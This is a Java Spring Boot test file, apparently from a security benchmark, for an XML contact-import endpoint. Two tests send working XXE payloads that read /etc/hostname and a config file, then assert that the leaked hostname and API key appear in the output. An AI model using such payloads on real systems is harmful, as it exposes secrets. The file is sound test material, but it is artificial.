package com.benchmark.rosterly;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.web.servlet.MockMvc;

import java.nio.file.Files;
import java.nio.file.Path;

import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.not;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;

@SpringBootTest
@AutoConfigureMockMvc
@TestPropertySource(properties = {"DB_PATH=:memory:", "SCORE_TOKEN=test-token"})
class ContactImportEntityTest {

    @Autowired
    private MockMvc mockMvc;
    @Autowired
    private ResetService resetService;
    @Autowired
    private RuntimeConfig runtimeConfig;

    @BeforeEach
    void resetState() throws Exception {
        resetService.resetAll();
    }

    private MockHttpSession loginAs(String username, String password) throws Exception {
        return TestSupport.loginAs(mockMvc, username, password);
    }

    @Test
    void systemEntityReadsLocalHostnameFile() throws Exception {
        MockHttpSession session = loginAs("alice", "password123");
        String payload = """
                <?xml version="1.0"?>
                <!DOCTYPE contacts [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
                <contacts><contact><name>&xxe;</name><email>a@b.com</email></contact></contacts>""";
        MockMultipartFile file = new MockMultipartFile("file", "p.xml", "application/xml", payload.getBytes());
        mockMvc.perform(multipart("/contacts/import").file(file).session(session));

        String liveHostname = Files.readString(Path.of("/etc/hostname")).trim();
        mockMvc.perform(get("/contacts").session(session))
                .andExpect(content().string(containsString(liveHostname)));
    }

    @Test
    void systemEntityReadsTheLiveConfigFile() throws Exception {
        MockHttpSession session = loginAs("bob", "password456");
        String payload = """
                <?xml version="1.0"?>
                <!DOCTYPE contacts [ <!ENTITY xxe SYSTEM "file:///app/config/application.properties"> ]>
                <contacts><contact><name>&xxe;</name><email>a@b.com</email></contact></contacts>""";
        MockMultipartFile file = new MockMultipartFile("file", "p.xml", "application/xml", payload.getBytes());
        mockMvc.perform(multipart("/contacts/import").file(file).session(session));

        mockMvc.perform(get("/contacts").session(session))
                .andExpect(content().string(containsString(runtimeConfig.getApiKey())));
    }

    @Test
    void aWellFormedImportWithoutDoctypeNeverLeaksAnything() throws Exception {
        MockHttpSession session = loginAs("alice", "password123");
        MockMultipartFile file = new MockMultipartFile("file", "safe.xml", "application/xml",
                "<contacts><contact><name>Jordan</name><email>j@x.com</email></contact></contacts>".getBytes());
        mockMvc.perform(multipart("/contacts/import").file(file).session(session));

        mockMvc.perform(get("/contacts").session(session))
                .andExpect(content().string(containsString("Jordan")))
                .andExpect(content().string(not(containsString(runtimeConfig.getApiKey()))));
    }

    @Test
    void multipleContactsInOneUploadAreAllImported() throws Exception {
        MockHttpSession session = loginAs("alice", "password123");
        String payload = "<contacts>"
                + "<contact><name>Ann</name><email>ann@x.com</email></contact>"
                + "<contact><name>Ben</name><email>ben@x.com</email></contact>"
                + "</contacts>";
        MockMultipartFile file = new MockMultipartFile("file", "multi.xml", "application/xml", payload.getBytes());
        mockMvc.perform(multipart("/contacts/import").file(file).session(session));

        mockMvc.perform(get("/contacts").session(session))
                .andExpect(content().string(containsString("Ann")))
                .andExpect(content().string(containsString("Ben")));
    }
}
